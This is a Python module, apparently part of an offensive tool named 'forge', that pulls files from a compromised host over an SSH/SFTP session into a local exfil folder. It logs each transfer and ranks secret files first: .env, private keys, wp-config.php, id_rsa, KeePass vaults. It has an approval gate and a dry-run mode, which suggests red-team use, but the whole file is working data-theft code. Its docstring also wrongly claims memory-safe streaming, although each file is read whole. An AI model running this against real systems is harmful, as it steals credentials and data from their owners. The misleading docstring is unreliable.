"""Phase 5: Data exfiltration pipeline.

Classification: DESTRUCTIVE — requires operator approval.
FORGE_SAFE_MODE=1 blocks all exfiltration. Data saved to downloads/.
Memory-safe: streams files in chunks, never loads full file into RAM.
"""
from __future__ import annotations

import hashlib
import logging
import os
import sqlite3
import sys
from pathlib import Path
from typing import Any, Optional

from forge.opsec.resilience import _SHUTDOWN, _interruptible_sleep
from forge.phase5.approval_gate import ActionClassification, request_approval

_LOG = logging.getLogger(__name__)

CHUNK_SIZE_BYTES = 8192
_EXFIL_DIR = Path("downloads") / "exfil"

# File patterns to prioritise for exfiltration
PRIORITY_PATTERNS = [
    "*.env", "*.key", "*.pem", "*.pfx", "config.php", "wp-config.php",
    "*.json", "database.yml", "secrets.*", "id_rsa", "*.kdbx",
]


def exfiltrate_files(
    engagement_id: int,
    target_host: dict,
    remote_paths: list[str],
    eng_db_conn: sqlite3.Connection,
    session: Any = None,
    dry_run: bool = False,
) -> dict[str, Any]:
    """Exfiltrate files from compromised host to downloads/exfil/.

    session: active SSH/WinRM session object from lateral_movement.
    Returns: {'files_exfiltrated': int, 'total_bytes': int, 'local_paths': list}
    """
    ip = target_host.get("ip", "unknown")

    approved = request_approval(
        "data_exfiltration",
        f"Exfiltrate {len(remote_paths)} file(s) from {ip}",
        engagement_id,
        eng_db_conn,
        ActionClassification.DESTRUCTIVE,
    )
    if not approved:
        return {"files_exfiltrated": 0, "total_bytes": 0, "local_paths": []}

    if _SHUTDOWN.is_set():
        return {"files_exfiltrated": 0, "total_bytes": 0, "local_paths": []}

    if dry_run:
        print(f"[DRY-RUN] Would exfiltrate from {ip}:")
        for p in remote_paths:
            print(f"  {p}")
        return {"files_exfiltrated": 0, "total_bytes": 0, "local_paths": []}

    dest_dir = _EXFIL_DIR / ip.replace(".", "_")
    dest_dir.mkdir(parents=True, exist_ok=True)

    local_paths = []
    total_bytes = 0
    exfil_count = 0

    for remote_path in remote_paths:
        if _SHUTDOWN.is_set():
            break

        file_name = Path(remote_path).name
        local_path = dest_dir / file_name
        tmp_path = local_path.with_suffix(".tmp")

        try:
            content = _fetch_remote_file(session, remote_path)
            if content is None:
                continue

            # Write atomically in chunks
            sha256 = hashlib.sha256()
            with open(tmp_path, "wb") as f:
                for i in range(0, len(content), CHUNK_SIZE_BYTES):
                    chunk = content[i:i + CHUNK_SIZE_BYTES]
                    f.write(chunk)
                    sha256.update(chunk)
                    if _SHUTDOWN.is_set():
                        break

            os.replace(tmp_path, local_path)
            total_bytes += local_path.stat().st_size
            local_paths.append(str(local_path))
            exfil_count += 1

            print(f"[EXFIL] {remote_path} -> {local_path} ({local_path.stat().st_size} bytes)", flush=True)
            sys.stdout.flush()

            _record_exfil(eng_db_conn, engagement_id, ip, remote_path, str(local_path), sha256.hexdigest())

        except Exception as e:
            _LOG.error("Exfiltration of %s failed: %s", remote_path, e)
            tmp_path.unlink(missing_ok=True)

    return {"files_exfiltrated": exfil_count, "total_bytes": total_bytes, "local_paths": local_paths}


def _fetch_remote_file(session: Any, remote_path: str) -> Optional[bytes]:
    """Fetch file content from remote session (SSH/WinRM)."""
    if session is None:
        _LOG.warning("No active session for file fetch")
        return None
    try:
        # asyncssh SFTPClient
        if hasattr(session, "start_client"):
            import asyncio
            async def _get():
                async with session.start_sftp_client() as sftp:
                    async with sftp.open(remote_path, "rb") as f:
                        return await f.read()
            return asyncio.run(_get())
    except Exception as e:
        _LOG.debug("SSH fetch failed: %s", e)
    return None


def _record_exfil(
    conn: sqlite3.Connection,
    engagement_id: int,
    source_ip: str,
    remote_path: str,
    local_path: str,
    sha256: str,
) -> None:
    try:
        conn.execute(
            """INSERT OR IGNORE INTO audit_log (engagement_id, action, detail, operator, timestamp)
               VALUES (?, 'exfiltration', ?, 'forge', datetime('now'))""",
            (engagement_id, f"{source_ip}:{remote_path} -> {local_path} [{sha256[:8]}]"),
        )
        conn.commit()
    except Exception:
        pass
